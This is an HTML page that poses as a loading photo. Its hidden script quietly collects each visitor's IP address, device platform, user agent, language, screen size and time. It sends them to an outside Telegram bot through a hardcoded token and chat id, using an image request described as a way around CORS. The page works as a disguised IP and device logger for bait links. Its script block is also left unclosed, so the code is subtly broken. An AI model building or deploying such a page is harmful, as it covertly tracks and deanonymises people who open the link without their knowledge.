<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка фото...</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        img { max-width: 90%; border-radius: 10px; opacity: 0.8; }
    </style>
</head>
<body>
    <img src="https://picsum.photos/800/600" alt="Фото">
    <p>Загрузка высокого качества...</p>

    <script>
        // Собираем данные
        let data = {
            ip: "Ожидание...",
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: screen.width + "x" + screen.height,
            time: new Date().toLocaleString()
        };

        // Запрос к API для получения IP (упрощенно)
        fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(res => { data.ip = res.ip; send(); })
        .catch(() => { data.ip = "Неизвестно"; send(); });

        function send() {
    const token = "9173439883:AAEOSS1Zx4kUugqZXNcbu6Ec2PvRfqkYLN4";
    const chat_id = "9236744381";
    
    // Экранируем текст для безопасной передачи в URL
    const text = encodeURIComponent(`🎯 *Новый клик!*\n\n📱 Устройство: ${data.platform}\n🌐 IP: ${data.ip}\n📏 Экран: ${data.screen}\n🗣 Язык: ${data.language}\n📅 Время: ${data.time}\n\n🔍 UA: ${data.userAgent}`);
    
    // Отправка через Image (обходит CORS)
    const img = new Image();
    img.src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=Markdown`;
}
</body>
</html>
